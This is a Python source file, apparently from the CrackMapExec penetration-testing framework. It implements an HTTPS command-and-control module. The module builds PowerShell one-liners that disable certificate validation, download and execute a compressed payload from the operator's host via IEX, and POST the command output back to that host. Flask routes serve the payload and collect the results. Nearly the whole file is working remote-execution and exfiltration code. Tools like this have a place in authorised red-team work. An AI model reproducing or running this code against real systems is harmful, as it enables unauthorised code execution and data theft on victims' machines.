import cme.servers.https as https_server
from gevent import sleep
from cme.c2 import C2
from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate
from cme.helpers.misc import gen_random_string
from flask import request, make_response


class Https(C2):
    def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
        C2.__init__(self, proto, payload, exec_methods, force_ps32, ret_output)

        self.filename = gen_random_string(8)
        self.post_path = gen_random_string(8)
        self.output = None

        self.command_with_output = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; " \
                                   "$payload = (New-Object Net.WebClient).DownloadString('https://{local_ip}:{port}/{filename}'); " \
                                   "$out = Invoke-Compress -Data (IEX (Invoke-Decompress -Data $payload) | Out-String);" \
                                   "$request = [System.Net.WebRequest]::Create('https://{local_ip}:{port}/{post_path}'); " \
                                   "$request.Method = 'POST'; " \
                                   "$request.ContentType = 'application/x-www-form-urlencoded'; " \
                                   "$bytes = [System.Text.Encoding]::ASCII.GetBytes($out); " \
                                   "$request.ContentLength = $bytes.Length; " \
                                   "$requestStream = $request.GetRequestStream(); " \
                                   "$requestStream.Write($bytes, 0, $bytes.Length); " \
                                   "$requestStream.Close(); " \
                                   "$request.GetResponse()".format(local_ip=self.proto.local_ip, port=443, filename=self.filename, post_path=self.post_path)

        self.command_without_output = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; " \
                                      "IEX (Invoke-Decompress -Data (New-Object Net.WebClient).DownloadString('https://{local_ip}:{port}/{filename}'));".format(local_ip=self.proto.local_ip, port=443, filename=self.filename)

    def run(self):
        compressed_payload = ps_deflate_and_encode(self.create_ps_payload(self.payload))

        @https_server.app.route('/{}'.format(self.filename), methods=['GET'], endpoint='serve_payload_{}'.format(gen_random_string()))
        def serve_payload():
            return compressed_payload, 200

        @https_server.app.route('/{}'.format(self.post_path), methods=['POST'], endpoint='payload_output_{}'.format(gen_random_string()))
        def payload_output():
            request.get_data()
            if request.remote_addr == self.target:
                self.output = ps_decode_and_inflate(request.data)
                return make_response('', 200)

            return make_response('', 404)

        self.execute_command(self.command_with_output if self.ret_output else self.command_without_output)

        while not self.output:
            sleep(1)

        return self.output
